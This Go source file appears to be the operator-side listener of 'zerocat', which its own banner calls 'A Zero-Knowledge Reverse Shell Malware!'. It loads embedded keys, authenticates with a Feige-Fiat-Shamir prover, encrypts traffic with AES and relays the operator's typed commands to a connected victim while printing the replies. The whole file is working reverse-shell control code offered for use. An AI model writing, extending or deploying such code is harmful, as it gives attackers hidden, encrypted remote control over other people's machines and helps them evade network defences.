//go:build private
// +build private

//go:generate go run ../key-gen/key_gen_ffs.go --private --path ../../keys/auth.keys

package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"math/big"
	"net"
	"os"

	"example.com/zerocat/pkg/auth"
	gt "example.com/zerocat/pkg/auth/group-theory"
	"example.com/zerocat/pkg/comm"
	"example.com/zerocat/pkg/enc"
)

var (
	private_key []*big.Int
	master_key  []byte
	ring        *gt.ModRing
	group       *gt.CompositeMulGroup
	challenger  *auth.ChainChallenger
	prover      *auth.FFSProver
)

func init() {
	private_bytes, err := base64.StdEncoding.DecodeString(private)

	if err != nil {
		panic(err)
	}

	private_key = make([]*big.Int, k)

	for i := 0; i < len(private_key); i++ {
		private_key[i] = big.NewInt(0)
		private_key[i].SetBytes(private_bytes[i*(size/8) : (i+1)*(size/8)])
	}

	master_key, err = base64.StdEncoding.DecodeString(master)

	modulus_bytes, err := base64.StdEncoding.DecodeString(modulus)

	if err != nil {
		panic(err)
	}

	modulus_big := big.NewInt(0)
	modulus_big.SetBytes(modulus_bytes)

	ring = gt.SetupModRing(modulus_big)
	group = gt.NewCompGroup(ring)

	challenger = auth.NewChainChallenger()
	prover = auth.SetupFFSProver(private_key, challenger, group)
}

func main() {

	network := flag.String("network", "tcp", "network protocol to use")
	address := flag.String("address", "127.0.0.1:9000", "the address to listen on")

	flag.Parse()

	banner()

	send := make(chan []byte)

	input_wrapper := comm.NewFFSInputWrapper(prover, os.Stdin)

	deriver := enc.NewSha256Deriver(master_key)
	encapsulator := enc.NewAESEncapsulator(deriver)

	encapsulation_buffer := new(bytes.Buffer)
	encapsulation_wrapper := comm.NewEncapsulationWrapper(encapsulator, encapsulation_buffer)

	go func() {
		for {
			data, err := input_wrapper.Wrap()
			challenger.Update(data[prover.Group().Ring().Size()/4:])

			if err != nil {
				panic(err)
			}

			send <- data
		}
	}()

	listenner, err := net.Listen(*network, *address)

	if err != nil {
		panic(err)
	}

	if connection, err := listenner.Accept(); err == nil {

		decryption_wrapper := comm.NewDecryptionWrapper(encapsulator, connection, 12, 32)

		go func() {
			for {
				data, err := decryption_wrapper.Wrap()

				if err != nil {
					panic(err)
				}

				os.Stdout.Write(data)
			}
		}()

		for {
			select {
			case outbound := <-send:
				encapsulation_buffer.Write(outbound)
				data, err := encapsulation_wrapper.Wrap()

				if err != nil {
					panic(err)
				}

				connection.Write(data)
			}
		}
	} else {
		panic(err)
	}
}

func banner() {
	fmt.Println("    .@@/                        (@@.    ")
	fmt.Println("  (@&  (@&                   .@@(  &@(  ")
	fmt.Println("  (@&    .@@/              (@&     &@(  ")
	fmt.Println("  (@&    .@@@@@@@@@@@@@@@@@@@&     &@(    ________          ________  ________  __________   ")
	fmt.Println("    .@@/      .@@/           .@@@@@.     |\\   __  \\        |\\   ____\\|\\   __  \\|\\____   __\\ ")
	fmt.Println("  (@@@@@@&                      (@@@@(   \\ \\  \\|\\  \\       \\ \\  \\___|\\ \\  \\|\\  \\|___ \\  \\_| ")
	fmt.Println("@@@@&       (@&         .@@/         /@@  \\ \\  \\\\\\  \\       \\ \\  \\    \\ \\   __  \\   \\ \\  \\  ")
	fmt.Println("@@@@@@@/                        (@@@@@@@   \\ \\  \\\\\\  \\       \\ \\  \\____\\ \\  \\ \\  \\   \\ \\  \\ ")
	fmt.Println("@@/      .@@/    (@@@@/    (@&     &@@@@    \\ \\_______\\       \\ \\_______\\ \\__\\ \\__\\   \\ \\__\\")
	fmt.Println("  (@&       (@@@@/    (@@@@/       &@(       \\|_______|        \\|_______|\\|__|\\|__|    \\|__|")
	fmt.Println("    .@@/                        (@@.    ")
	fmt.Println("       (@@@@@@@@@@@@@@@@@@@@@@@@(        A Zero-Knowledge Reverse Shell Malware!")
	fmt.Println("                 (@@@@@@&          &@@@@")
	fmt.Println("              .@@/      .@@@@&  (@@.    ")
	fmt.Println("              .@@/         (@@@@(       ")
}
